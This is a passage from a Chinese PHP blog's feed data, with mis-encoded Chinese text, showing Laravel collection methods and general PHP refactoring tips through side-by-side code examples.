ä½¿ç”¨ä¼ ç»Ÿçš„foreach æ–¹å¼è¿›è¡Œéå†ï¼š 1234567$sum = 0;foreach ($orders as $order) &#123; foreach ($order['order_products'] as $item) &#123; $sum += $item['price']; &#125;&#125;echo $sum; ä½¿ç”¨é›†åˆçš„mapã€flattenã€sumï¼š 1234567$sum = collect($orders)-&gt;map(function($order)&#123; return $order['order_products'];&#125;)-&gt;flatten(1)-&gt;map(function($order)&#123; return $order['price'];&#125;)-&gt;sum();echo $sum; mapï¼šéå†é›†åˆï¼Œè¿”å›ä¸€ä¸ªæ–°çš„é›†åˆã€‚flattenï¼šå°†å¤šç»´æ•°ç»„è½¬æ¢ä¸ºä¸€ç»´ã€‚sumï¼šè¿”å›æ•°ç»„çš„å’Œã€‚ ä½¿ç”¨é›†åˆçš„flatMapã€pluckã€sumï¼š1234$sum = collect($orders)-&gt;flatMap(function($order)&#123; return $order['order_products'];&#125;)-&gt;pluck('price')-&gt;sum();echo $sum; flatMapï¼šå’Œmap ç±»ä¼¼ï¼Œä¸è¿‡åŒºåˆ«åœ¨äºflatMap å¯ä»¥ç›´æ¥ä½¿ç”¨è¿”å›çš„æ–°é›†åˆã€‚ ä½¿ç”¨é›†åˆçš„flatMapã€sumï¼š123$sum = collect($orders)-&gt;flatMap(function($order)&#123; return $order['order_products'];&#125;)-&gt;sum('price'); sumï¼šå¯ä»¥æ¥æ”¶ä¸€ä¸ªåˆ—åä½œä¸ºå‚æ•°è¿›è¡Œæ±‚å’Œã€‚ æ ¼å¼åŒ–æ•°æ® éœ€æ±‚ï¼šå°†å¦‚ä¸‹ç»“æ„çš„æ•°ç»„ï¼Œæ ¼å¼åŒ–æˆä¸‹é¢çš„æ–°æ•°ç»„ã€‚ 12345678910111213141516171819// å¸¦æ ¼å¼åŒ–æ•°ç»„$gates = [ 'BaiYun_A_A17', 'BeiJing_J7', 'ShuangLiu_K203', 'HongQiao_A157', 'A2', 'BaiYun_B_B230'];// æ–°æ•°ç»„$boards = [ 'A17', 'J7', 'K203', 'A157', 'A2', 'B230']; ä½¿ç”¨foreach è¿›è¡Œéå†ï¼š 12345678910$res = [];foreach($gates as $key =&gt; $gate) &#123; if(strpos($gate, '_') === false) &#123; $res[$key] = $gate; &#125;else&#123; $offset = strrpos($gate, '_') + 1; $res[$key] = mb_substr($gate , $offset); &#125;&#125;var_dump($res); ä½¿ç”¨é›†åˆçš„mapä»¥åŠphp çš„explodeã€endï¼š 1234$res = collect($gates)-&gt;map(function($gate) &#123; $parts = explode('_', $gate); return end($parts);&#125;); ä½¿ç”¨é›†åˆçš„mapã€explodeã€lastã€toArrayï¼š 123$res = collect($gates)-&gt;map(function($gate) &#123; return collect(explode('_', $gate))-&gt;last();&#125;)-&gt;toArray(); explodeï¼šå°†å­—ç¬¦ä¸²è¿›è¡Œåˆ†å‰²æˆæ•°ç»„lastï¼šè·å–æœ€åä¸€ä¸ªå…ƒç´  ç»Ÿè®¡GitHub Eventé¦–å…ˆï¼Œé€šè¿‡æ­¤é“¾æ¥è·å–åˆ°ä¸ªäººäº‹ä»¶jsonã€‚ ä¸€ä¸ª PushEventè®¡ 5 åˆ†ï¼Œä¸€ä¸ª CreateEvent è®¡ 4 åˆ†ï¼Œä¸€ä¸ª IssueCommentEventè®¡ 3 åˆ†ï¼Œä¸€ä¸ª IssueCommentEvent è®¡ 2 åˆ†ï¼Œé™¤æ­¤ä¹‹å¤–çš„å…¶å®ƒç±»å‹çš„äº‹ä»¶è®¡ 1 åˆ†ï¼Œè®¡ç®—å½“å‰ç”¨æˆ·çš„æ—¶é—´å¾—åˆ†æ€»å’Œã€‚ 12345678910$opts = [ 'http' =&gt; [ 'method' =&gt; 'GET', 'header' =&gt; [ 'User-Agent: PHP' ] ]];$context = stream_context_create($opts);$events = json_decode(file_get_contents('http://api.github.com/users/0xAiKang/events', false, $context), true); ä¼ ç»Ÿforeach æ–¹å¼ï¼š 12345678910111213141516171819202122232425$eventTypes = []; // äº‹ä»¶ç±»å‹$score = 0; // æ€»å¾—åˆ†foreach ($events as $event) &#123; $eventTypes[] = $event['type'];&#125;foreach($eventTypes as $eventType) &#123; switch ($eventType) &#123; case 'PushEvent': $score += 5; break; case 'CreateEvent': $score += 4; break; case 'IssueEvent': $score += 3; break; case 'IssueCommentEvent': $score += 2; break; default: $score += 1; break; &#125;&#125; ä½¿ç”¨é›†åˆçš„mapã€pluckã€sum æ–¹æ³•ï¼š 1234567891011121314$score = $events-&gt;pluck('type')-&gt;map(function($eventType) &#123; switch ($eventType) &#123; case 'PushEvent': return 5; case 'CreateEvent': return 4; case 'IssueEvent': return 3; case 'IssueCommentEvent': return 2; default: return 1; &#125;&#125;)-&gt;sum(); ä½¿ç”¨é›†åˆçš„é“¾å¼ç¼–ç¨‹ï¼Œå¯ä»¥å¾ˆå¥½åœ°è§£å†³ä¸Šé¢é‚£ç§å¤šæ¬¡éå†çš„é—®é¢˜ã€‚ ä½¿ç”¨é›†åˆä¸­çš„mapã€pluckã€get æ–¹æ³•ï¼š 12345678$score = $events-&gt;pluck('type')-&gt;map(function($eventType) &#123; return collect([ 'PushEvent'=&gt; 5, 'CreateEvent'=&gt; 4, 'IssueEvent'=&gt; 3, 'IssueCommentEvent'=&gt; 2 ])-&gt;get($eventType, 1); // å¦‚æœä¸å­˜åœ¨åˆ™é»˜è®¤ç­‰äº1&#125;)-&gt;sum(); å°è¯•å°†è¯¥éœ€æ±‚ï¼Œå°è£…æˆä¸€ä¸ªç±»ï¼š 12345678910111213141516171819202122232425262728class GithubScore &#123; private $events; private function __construct($events)&#123; $this-&gt;events = $events; &#125; public static function score($events) &#123; return (new static($events))-&gt;scoreEvents(); &#125; private function scoreEvents() &#123; return $this-&gt;events-&gt;pluck('type')-&gt;map(function($eventType)&#123; return $this-&gt;lookupEventScore($eventType, 1); &#125;)-&gt;sum(); &#125; public function lookupEventScore($eventType, $default_value) &#123; return collect([ 'PushEvent'=&gt; 5, 'CreateEvent'=&gt; 4, 'IssueEvent'=&gt; 3, 'IssueCommentEvent'=&gt; 2 ])-&gt;get($eventType, $default_value); // å¦‚æœä¸å­˜åœ¨åˆ™é»˜è®¤ç­‰äº1 &#125;&#125;var_dump(GithubScore::score($events)); æ ¼å¼åŒ–æ•°æ® éœ€æ±‚ï¼šå°†ä»¥ä¸‹æ•°æ®æ ¼å¼åŒ–æˆæ–°çš„ç»“æ„ã€‚ 12345678910$messages = [ 'Should be working now for all Providers.', 'If you see one where spaces are in the title let me know.', 'But there should not have blank in the key of config or .env file.'];// æ ¼å¼åŒ–ä¹‹åçš„ç»“æœ- Should be working now for all Providers. \\n- If you see one where spaces are in the title let me know. \\n- But there should not have blank in the key of config or .env file. ä¼ ç»Ÿçš„foreach æ–¹å¼ï¼š 12345$comment = '- ' . array_shift($messages);foreach ($messages as $message) &#123; $comment .= \"\\n - $&#123;message&#125;\";&#125;var_dump($comment); ä½¿ç”¨é›†åˆçš„mapã€implodeæ–¹æ³•ï¼š 1234$comment = collect($messages)-&gt;map(function($message)&#123; return '- ' . $message;&#125;)-&gt;implode(\"\\n\");var_dump($comment); å¤šä¸ªæ•°ç»„æ±‚å·® éœ€æ±‚ï¼šä¸¤ç»„æ•°æ®åˆ†åˆ«ä»£è¡¨å»å¹´çš„è¥æ”¶å’Œä»Šå¹´çš„è¥æ”¶ï¼Œæ±‚æ¯ä¸ªæœˆçš„ç›ˆäºæƒ…å†µã€‚ 1234567891011121314151617181920212223242526272829$lastYear = [ 6345.75, 9839.45, 7134.60, 9479.50, 9928.0, 8652.00, 7658.40, 10245.40, 7889.40, 3892.40, 3638.40, 2339.40];$thisYear = [ 6145.75, 6895.00, 3434.00, 9349350, 9478.60, 7652.80, 4758.40, 10945.40, 3689.40, 8992.40, 7588.40, 2239.40]; ä¼ ç»Ÿçš„foreach æ–¹å¼ï¼š 12345$profit = [];foreach($thisYear as $key =&gt; $monthly)&#123; $profit[$key] = $monthly - $lastYear[$key];&#125;var_dump($profit); ä½¿ç”¨é›†åˆçš„zipã€firstã€lastï¼š 123$profit = collect($thisYear)-&gt;zip($lastYear)-&gt;map(function($monthly)&#123; return $monthly-&gt;first() - $monthly-&gt;last();&#125;); zipï¼šå°†ç»™å®šæ•°ç»„çš„å€¼ä¸ç›¸åº”ç´¢å¼•å¤„çš„åŸé›†åˆçš„å€¼åˆå¹¶åœ¨ä¸€èµ·ã€‚ åˆ›å»ºlookup æ•°ç»„ éœ€æ±‚ï¼šå°†å¦‚ä¸‹æ•°ç»„æ ¼å¼åŒ–æˆä¸‹é¢çš„ç»“æœï¼š 123456789101112131415161718192021222324$employees = [ [ 'name' =&gt; 'example', 'email' =&gt; 'example@exmaple.com', 'company' =&gt; 'example Inc.' ], [ 'name' =&gt; 'Lucy', 'email' =&gt; 'lucy@example.com', 'company' =&gt; 'ibm Inc.' ], [ 'name' =&gt; 'Taylor', 'email' =&gt; 'toylor@laravel.com', 'company'=&gt;'Laravel Inc.' ]];// æ ¼å¼åŒ–ä¹‹åçš„ç»“æœ$lookup = [ 'example' =&gt; 'example@example.com', 'Lucy' =&gt; â€˜lucy@example.comâ€™, 'Taylor'=&gt; 'toylor@laravel.com']; ä¼ ç»Ÿçš„foreach æ–¹å¼ï¼š 1234$emails = [];foreach ($employees as $key =&gt; $value) &#123; $emails[$value['name']] = $value['email'];&#125; ä½¿ç”¨é›†åˆçš„reduce æ–¹æ³•ï¼š 1234$emails = collect($employees)-&gt;reduce(function($emailLookup, $employee)&#123; $emailLookup[$employee['name']] = $employee['email']; return $emailLookup;&#125;,[]); reduceï¼šå°†æ¯æ¬¡è¿­ä»£çš„ç»“æœä¼ é€’ç»™ä¸‹ä¸€æ¬¡è¿­ä»£ç›´åˆ°é›†åˆå‡å°‘ä¸ºå•ä¸ªå€¼ã€‚ ä½¿ç”¨é›†åˆçš„pluck æ–¹æ³•ï¼š1$emails = collect($employees)-&gt;pluck('name', 'email'); è¿”å›ä¸€ç»´æ•°ç»„éœ€æ±‚ï¼šå°†ä¸‹é¢çš„äºŒç»´æ•°ç»„ï¼Œè½¬æ¢ä¸ºä¸€ç»´æ•°ç»„ã€‚ 1234567891011121314151617$nums = [ [ 188 ], [ 238, 383, 123, 348, ], [ 23, 87, 348, 98, ]]; ä¼ ç»Ÿforeach æ–¹å¼ï¼š 123456$result = [];foreach ($nums as $value) &#123; foreach ($value as $num) &#123; $result[] = $num; &#125;&#125; ä½¿ç”¨é›†åˆçš„flattenã€mapï¼š123$result = collect($nums)-&gt;flatten(1)-&gt;map(function ($num)&#123; return $num;&#125;); æ±‚å’Œ1234567891011121314$orders = [ [ \"id\" =&gt; \"1000\", \"price\" =&gt; 80, ], [ \"id\" =&gt; \"1001\", \"price\" =&gt; 120, ], [ \"id\" =&gt; \"1002\", \"price\" =&gt; 30, ],]; ä¼ ç»Ÿforeachæ–¹å¼ï¼š 1234$total_price = 0;foreach ($orders as $order) &#123; $total_price += $order[\"price\"];&#125; array å‡½æ•°ï¼š 1$total_price = array_sum(array_column($orders, \"price\")); ä½¿ç”¨é›†åˆï¼š 1234567// æ–¹å¼ä¸€ï¼š$total_price = collect($orders)-&gt;map(function ($order)&#123; return $order['price'];&#125;)-&gt;sum();// æ–¹å¼äºŒï¼š$total_price = collect($orders)-&gt;pluck(\"price\")-&gt;sum(); åˆ†ç»„123456789101112131415161718192021222324252627$products = [ [ \"id\" =&gt; 1, \"brand\" =&gt; \"iPhone\", \"name\" =&gt; \"iPhone 12\" ], [ \"id\" =&gt; 2, \"brand\" =&gt; \"OPPO\", \"name\" =&gt; \"OPPO R11\", ], [ \"id\" =&gt; 3, \"brand\" =&gt; \"å°ç±³\", \"name\" =&gt; \"å°ç±³ 11\", ], [ \"id\" =&gt; 2, \"brand\" =&gt; \"OPPO\", \"name\" =&gt; \"OPPO R12\", ], [ \"id\" =&gt; 3, \"brand\" =&gt; \"å°ç±³\", \"name\" =&gt; \"å°ç±³ 10\", ],]; ä½¿ç”¨é›†åˆï¼š 12345678910$product = collect($products)-&gt;pluck(\"brand\");$grouped = collect($products)-&gt;groupBy(\"id\");$result = $product-&gt;map(function ($value, $key) use ($grouped)&#123; return [ \"brand\" =&gt; $value, \"child\" =&gt; $grouped[$key], ];&#125;)-&gt;values(); å‚è€ƒé“¾æ¥ collectionåœ¨å®é™…å¼€å‘ä¸­çš„ä½¿ç”¨","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Tips of PHP","slug":"tips-of-php","date":"2021-04-28T14:28:49.000Z","updated":"2021-06-28T14:40:35.383Z","comments":true,"path":"tips-of-php/","link":"","permalink":"https://www.0x2beace.com/tips-of-php/","excerpt":"Awesome tips for PHP.","text":"Awesome tips for PHP. å‡å°‘ifâ€¦else çš„ä½¿ç”¨if...else é€šå¸¸æ˜¯ä¸€ä¸ªç³Ÿç³•çš„é€‰æ‹©ï¼Œå®ƒå¯¼è‡´è®¾è®¡å¤æ‚ï¼Œä»£ç å¯è¯»æ€§å·®ï¼Œå¹¶ä¸”å¯èƒ½å¯¼è‡´é‡æ„å›°éš¾ã€‚ 123456789101112131415function doSomething() &#123; if (...) &#123; if (...) &#123; // ... &#125; esle &#123; // ... &#125; &#125; else &#123; if (...) &#123; // ... &#125; esle &#123; // ... &#125; &#125;&#125; å¥½åœ¨å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼å¯ä»¥é¿å…å¯¹if...else çš„è¿‡åº¦ä¾èµ–ï¼š æå‰ returnï¼š1234567public function run($input)&#123; if ($input &gt; 5)&#123; // do something &#125; else &#123; // do something else &#125;&#125; åªéœ€è¦åˆ é™¤else å—ï¼Œå³å¯ç®€åŒ–æ­¤è¿‡ç¨‹ï¼š 12345678public function run($input)&#123; if ($input &gt; 5)&#123; // do something return; &#125; // do something else &#125; switch...case ä¹Ÿæ˜¯ä¸é”™åœ°é€‰æ‹©ï¼š12345678910111213public function run($input)&#123; switch($input)&#123; case \"A\": // do something break; case \"B\": // do else something break\u001c // ... &#125;&#125; ä½¿ç”¨tryâ€¦catch123456789101112131415161718192021222324252627282930313233343536373839404142class UserModel&#123; public function login($username = '', $password = '') &#123; if (...) &#123; // ç”¨æˆ·ä¸å­˜åœ¨ return -1; &#125; if (...) &#123; // å¯†ç é”™è¯¯ return -2; &#125; // code... &#125;&#125;class UserController&#123; public function login($username = '', $password = '') &#123; $model = new UserModel(); $res = $model-&gt;login($username, $password); if ($res === -1) &#123; return [ 'code' =&gt; '404', 'message' =&gt; 'ç”¨æˆ·ä¸å­˜åœ¨' ]; &#125; if ($res === -2) &#123; return [ 'code' =&gt; '400', 'message' =&gt; 'å¯†ç é”™è¯¯' ]; &#125; // code... &#125;&#125; ä½¿ç”¨try...catch é‡å†™ï¼š 12345678910111213141516171819202122232425262728293031323334353637class UserModel&#123; public function login($username = '', $password = '') &#123; if (...) &#123; // ç”¨æˆ·ä¸å­˜åœ¨ throw new Exception('ç”¨æˆ·ä¸å­˜åœ¨', '404'); &#125; if (...) &#123; // å¯†ç é”™è¯¯ throw new Exception('å¯†ç é”™è¯¯', '400'); &#125; // ... &#125;&#125;class UserController&#123; public function login($username = '', $password = '') &#123; try &#123; $model = new UserModel(); $res = $model-&gt;login($username, $password); // å¦‚æœéœ€è¦çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œç»Ÿä¸€commitæ•°æ®åº“äº‹åŠ¡ // $db-&gt;commit(); &#125; catch (Exception $e) &#123; // å¦‚æœéœ€è¦çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œç»Ÿä¸€rollbackæ•°æ®åº“äº‹åŠ¡ // $db-&gt;rollback(); &#125; // ... &#125;&#125; é€šè¿‡ä½¿ç”¨try...catch é‡å†™ï¼Œä½¿å¾—ä»£ç é€»è¾‘èŒè´£åˆ†æ˜ã€æ›´åŠ æ¸…æ™°ã€‚try åªç”¨å…³å¿ƒä¸šåŠ¡æ­£å¸¸æƒ…å†µçš„å¤„ç†ï¼Œè€Œæ‰€æœ‰å¼‚å¸¸åˆ™ç»Ÿä¸€åœ¨catch ä¸­å¤„ç†ï¼Œä¸Šæ¸¸åªéœ€å°†å¼‚å¸¸æŠ›å‡ºå³å¯ã€‚ ä½¿ç”¨åŒ¿åå‡½æ•°éœ€è¦åœ¨ä¸€ä¸ªæ–¹æ³•ä¸­ï¼Œé‡å¤å¤„ç†æŸä¸ªé€»è¾‘ï¼Œè¿™æ—¶å¯èƒ½ä¼šå°†å…¶å°è£…æˆä¸€ä¸ªå‡½æ•°ï¼Œå³ï¼š 123456789101112131415function doSomething(...) &#123; // ... format(...); // ... format(...); // ...&#125;// å£°æ˜ä¸€ä¸ªæ ¼å¼åŒ–ä»£ç çš„å‡½æ•°æˆ–æ–¹æ³•function format() &#123; // æ ¼å¼åŒ–ä»£ç æ®µ // ...&#125; ä¸Šé¢è¿™æ®µä»£ç å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªå‡½æ•°ä»…ä»…åªåœ¨doSomething ä¸­ä½¿ç”¨å‘¢ï¼Ÿæ›´å¥½åœ°åšæ³•åº”è¯¥æ˜¯è¿™æ ·ï¼š 123456789101112131415function doSomething() &#123; // ... $format = function (...) use (...) &#123; // æ ¼å¼åŒ–ä»£ç æ®µ // ... &#125;; // ... $format(...); // ... $format(...); //...&#125; ç®€å•çš„ç­–ç•¥æ¨¡å¼å®¢æˆ·ç«¯åœ¨åšå†³ç­–æ—¶ï¼Œé€šå¸¸ä¼šæ ¹æ®ä¸åŒçš„ä¸Šä¸‹æ–‡ç¯å¢ƒé€‰æ‹©ä¸åŒçš„ç­–ç•¥ï¼Œå¯èƒ½ä¼šå†™æˆä¸‹é¢è¿™æ ·ï¼š 12345678910111213141516class One&#123; public function doSomething() &#123; if (...) &#123; $instance = new A(); &#125; elseif (...) &#123; $instance = new B(); &#125; else &#123; $instance = new C(); &#125; $instance-&gt;doSomething(...); // ... &#125;&#125; ä¸Šé¢è¿™ç§æƒ…å†µï¼Œæ— è®ºæ˜¯ä½¿ç”¨if...elseè¿˜æ˜¯switch...case å½“ç­–ç•¥å¢å¤šæ—¶ï¼Œéƒ½ä¼šå‡ºç°å¤§é‡åˆ†æ”¯é€»è¾‘åˆ¤æ–­ï¼Œå¥½å†™çš„åšæ³•æ˜¯å®šä¹‰ä¸€ä¸ªç®€å•çš„ç­–ç•¥ï¼š 1234567891011121314151617class One&#123; private $map = [ 'a' =&gt; 'namespace\\A', 'b' =&gt; 'namespace\\B', 'c' =&gt; 'namespace\\C' ]; public function doSomething() &#123; // ... $instance = new $this-&gt;map[$strategy]; $instance-&gt;doSomething(...); // ... &#125;&#125; ä¾èµ–æ³¨å…¥123456789101112131415161718192021class One&#123; private $instance; public function __construct() &#123; $this-&gt;intance = new Two(); &#125; public function doSomething() &#123; if (...) &#123; // å¦‚æœæŸç§æƒ…å†µè°ƒç”¨ç±»Twoçš„å®ä¾‹æ–¹æ³• $this-&gt;instance-&gt;do(...); &#125; ... &#125;&#125;$instance = new One();$instance-&gt;doSomething(); ä¸Šé¢è¿™æ®µä»£ç æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ ä¸ç¬¦åˆè®¾è®¡æ¨¡å¼çš„æœ€å°‘çŸ¥é“åŸåˆ™ï¼ŒOne ç±»å†…éƒ¨ç›´æ¥ä¾èµ–äº†Two ç±»ã€‚ ä½¿ç”¨ä¾èµ–æ³¨å…¥é‡å†™æ­¤ç±»ï¼š 123456789101112131415161718192021222324252627class One&#123; private $closure; public function __construct(Closure $closure) &#123; $this-&gt;closure = $closure; &#125; public function doSomething() &#123; if (...) &#123; // ç”¨çš„æ—¶å€™å†å®ä¾‹åŒ– // å®ç°æ‡’åŠ è½½ $instance = $this-&gt;closure(); $instance-&gt;do(...) &#125; ... &#125;&#125;...$instance = new One(function () &#123; // ä»å¤–éƒ¨æ³¨å…¥Two ç±» return new Two();&#125;);$instance-&gt;doSomething(); isset è¯­æ³•ç³–isset è¯­æ³•ç³–ï¼š 12345$name = isset($params[\"name\"]) ? isset($params[\"name\"]) : \"\";$name = isset($params[\"name\"]) ?: \"\";$name = $params[\"name\"] ?? \"\"; åŸæ–‡åœ°å€ easy-tips/php","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Laravel Collection åŸºæœ¬ä½¿ç”¨","slug":"basic-use-of-collection-in-laravel","date":"2021-04-25T15:17:05.000Z","updated":"2022-03-25T09:03:22.825Z","comments":true,"path":"basic-use-of-collection-in-laravel/","link":"","permalink":"https://www.0x2beace.com/basic-use-of-collection-in-laravel/","excerpt":"é›†åˆæ˜¯Laravel ä¸­æä¾›çš„æœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œé›†åˆæœ¬è´¨ä¸Šæ˜¯ç”±åŠŸèƒ½å¼ºå¤§çš„æ•°ç»„ç»„æˆã€‚","text":"é›†åˆæ˜¯Laravel ä¸­æä¾›çš„æœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œé›†åˆæœ¬è´¨ä¸Šæ˜¯ç”±åŠŸèƒ½å¼ºå¤§çš„æ•°ç»„ç»„æˆã€‚ æŠŠç±»ä¼¼æ•°ç»„çš„å¯¹è±¡åº”ç”¨åˆ°æ–¹æ³•ä¸­æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œé€šè¿‡é“¾å¼ç¼–ç¨‹ï¼Œç”¨æçŸ­çš„ä»£ç ï¼Œå°±å¯ä»¥è¾¾åˆ°é¢„æœŸçš„æ•ˆæœã€‚ éœ€è¦æ³¨æ„çš„æ˜¯é›†åˆå¹¶ä¸æ˜¯Laravel ä¸­ç‹¬æœ‰çš„ï¼Œè®¸å¤šè¯­è¨€éƒ½å¯ä»¥åœ¨æ•°ç»„ä¸­ä½¿ç”¨é›†åˆå¼ç¼–ç¨‹ï¼Œä½†éå¸¸é—æ†¾ï¼ŒåŸç”Ÿçš„PHP æ˜¯ä¸æ”¯æŒé›†åˆå¼ç¼–ç¨‹çš„ï¼Œä¸è¿‡å¹¸è¿çš„æ˜¯ï¼Œä¸€äº›å‹¤åŠ³çš„äººå·²ç»ä¸ºæˆ‘ä»¬å®Œæˆäº†è‰°è‹¦çš„å·¥ä½œï¼Œå¹¶ç¼–å†™äº†ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„åŒ…â€”â€”illuminate/supportã€Tightenco/Collect ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œé›†åˆæ˜¯ä¸å¯æ”¹å˜çš„ï¼Œè¿™æ„å‘³ç€å¤§éƒ¨åˆ† Collection æ–¹æ³•éƒ½ä¼šè¿”å›ä¸€ä¸ªå…¨æ–°çš„ Collection å®ä¾‹ã€‚ åˆ›å»ºé›†åˆä¸ºäº†åˆ›å»ºä¸€ä¸ªé›†åˆï¼Œå¯ä»¥å°†ä¸€ä¸ªæ•°ç»„ä¼ å…¥é›†åˆçš„æ„é€ å™¨ä¸­ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªç©ºçš„é›†åˆï¼Œç„¶åæŠŠå…ƒç´ å†™åˆ°é›†åˆä¸­ã€‚Laravel æœ‰collect()åŠ©æ‰‹ï¼Œè¿™æ˜¯æœ€ç®€å•çš„ï¼Œæ–°å»ºé›†åˆçš„æ–¹æ³•ã€‚ 1$collection = collect([1, 2, 3]); é»˜è®¤æƒ…å†µä¸‹ï¼Œ Eloquent æŸ¥è¯¢çš„ç»“æœè¿”å›çš„å†…å®¹éƒ½æ˜¯ Illuminate\\Support\\Collection å®ä¾‹ï¼Œå¦‚æœå¸Œæœ›å¯¹ç»“æœè¿›è¡Œåºåˆ—åŒ–ï¼Œå¯ä»¥ä½¿ç”¨toArray()ã€toJson() æ–¹æ³•ã€‚ åœ¨éLaravel é¡¹ç›®ä¸­ä½¿ç”¨é›†åˆï¼š å®‰è£…ï¼š 1composer require illuminate/support ä½¿ç”¨ï¼š 123456&lt;?php// å¼•å…¥packagerequire __DIR__ . '/vendor/autoload.php';$collection = collect([1, 2, 3]);var_dump($collection); è®°ä½ï¼Œæ‰€æœ‰æ–¹æ³•éƒ½å¯ä»¥ä½¿ç”¨é“¾å¼ç¼–ç¨‹çš„æ–¹å¼ä¼˜é›…çš„æ“çºµæ•°ç»„ã€‚è€Œä¸”å‡ ä¹æ‰€æœ‰çš„æ–¹æ³•éƒ½ä¼šè¿”å›æ–°çš„ Collection å®ä¾‹ã€‚ æ–¹æ³•åˆ—è¡¨allè¿”å›è¯¥é›†åˆè¡¨ç¤ºçš„åº•å±‚æ•°ç»„ã€‚ 12collect([\"boo\", \"yumi\", \"mac\"])-&gt;all();// [â€œbooâ€, \"yumi\", \"mac\"] avgè·å–æ•°ç»„çš„å¹³å‡å€¼ï¼š 1collect([1, 1, 2, 4])-&gt;avg(); // 2 è·å–äºŒç»´æ•°ç»„çš„å¹³å‡å€¼ï¼š 1collect([['foo' =&gt; 10], ['foo' =&gt; 10], ['foo' =&gt; 20], ['foo' =&gt; 40]])-&gt;avg('foo'); // 20 averageavg()æ–¹æ³•çš„åˆ«åï¼Œä¸¤è€…çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚ chunkå°†å¤§é›†åˆæŒ‰æŒ‡å®šå¤§å°æ‹†åˆ†æˆå°é›†åˆã€‚ 1234$collection = collect([1, 2, 3, 4, 5, 6, 7]);$chunks = $collection-&gt;chunk(4);$chunks-&gt;toArray();// [[1, 2, 3, 4], [5, 6, 7]] chunkWhileæ ¹æ®æŒ‡å®šçš„å›è°ƒå€¼æŠŠé›†åˆåˆ†è§£æˆå¤šä¸ªæ›´å°çš„é›†åˆï¼š 12345678$collection = collect(str_split('AABBCCCD'));$chunks = $collection-&gt;chunkWhile(function ($current, $key, $chunk) &#123; return $current === $chunk-&gt;last();&#125;);$chunks-&gt;all();// [['A', 'A'], ['B', 'B'], ['C', 'C', 'C'], ['D']] collapseå°†å¤šä¸ªæ•°ç»„åˆå¹¶æˆä¸€ä¸ªé›†åˆã€‚ 12345$collection = collect([[1, 2, 3], [4, 5, 6], [7, 8, 9]]);// æ³¨æ„è¿™é‡Œè¿”å›äº†ä¸€ä¸ªæ–°çš„é›†åˆ$collapsed = $collection-&gt;collapse();$collapsed-&gt;all();// [1, 2, 3, 4, 5, 6, 7, 8, 9] combineå°†ä¸€ä¸ªé›†åˆçš„å€¼ä½œä¸ºã€Œé”®ã€ï¼Œå†å°†å¦ä¸€ä¸ªæ•°ç»„æˆ–è€…é›†åˆçš„å€¼ä½œä¸ºã€Œå€¼ã€åˆå¹¶æˆä¸€ä¸ªé›†åˆã€‚ 1234$collection = collect(['name', 'age']);$combined = $collection-&gt;combine(['boo', 25]);$combined-&gt;all();// ['name' =&gt; 'boo', 'age' =&gt; 25] collectè¿”å›ä¸€ä¸ªåŒ…å«å½“å‰é›†åˆæ‰€å«å…ƒç´ çš„æ–°çš„ Collection å®ä¾‹ï¼š 123$collection = collect([1, 2, 3]);$collection-&gt;all(); // [1,2,3] concatè¿½åŠ ç»™å®šæ•°ç»„æˆ–é›†åˆæ•°æ®åˆ°é›†åˆæœ«å°¾ã€‚ 1234$collection = collect(['John Doe']);$concatenated = $collection-&gt;concat(['Boo'])-&gt;concat(['name' =&gt; 'Yumi']);$concatenated-&gt;all();// ['John Doe', 'Boo', 'Yumi'] containsåˆ¤æ–­é›†åˆæ˜¯å¦åŒ…å«ç»™å®šçš„é¡¹ç›®ã€‚ åŸºæœ¬ç”¨æ³•ï¼š 123$collection = collect(['name' =&gt; 'boo', 'age' =&gt; 25]);$collection-&gt;contains('boo'); // true$collection-&gt;contains('yumi'); // false ä¹Ÿå¯ä»¥ç”¨ contains æ–¹æ³•åŒ¹é…ä¸€å¯¹é”®/å€¼ï¼Œå³åˆ¤æ–­ç»™å®šçš„é…å¯¹æ˜¯å¦å­˜åœ¨äºé›†åˆä¸­ï¼š 123456$collection = collect([ ['name' =&gt; 'boo', 'age' =&gt; 25], ['name' =&gt; 'yumi', 'age' =&gt; 23],]);$collection-&gt;contains(\"name\", \"mac\"); // false ä¹Ÿå¯ä»¥ä¼ é€’ä¸€ä¸ªå›è°ƒåˆ° contains æ–¹æ³•æ¥æ‰§è¡Œè‡ªå·±çš„çœŸå®æµ‹è¯•ï¼š 123456$collection = collect([1, 2, 3, 4, 5]);// $value: 1 $key: 0$collection-&gt;contains(function ($value, $key) &#123; return $value &gt; 5;&#125;); // false contains æ–¹æ³•åœ¨æ£€æŸ¥é¡¹ç›®å€¼æ—¶ä½¿ç”¨ã€Œå®½æ¾ã€æ¯”è¾ƒï¼Œæ„å‘³ç€å…·æœ‰æ•´æ•°å€¼çš„å­—ç¬¦ä¸²å°†è¢«è§†ä¸ºç­‰äºç›¸åŒå€¼çš„æ•´æ•°ã€‚ ç›¸å containsStrict æ–¹æ³•åˆ™æ˜¯ä½¿ç”¨ã€Œä¸¥æ ¼ã€æ¯”è¾ƒè¿›è¡Œè¿‡æ»¤ã€‚ containsStrictä½¿ç”¨ã€Œä¸¥æ 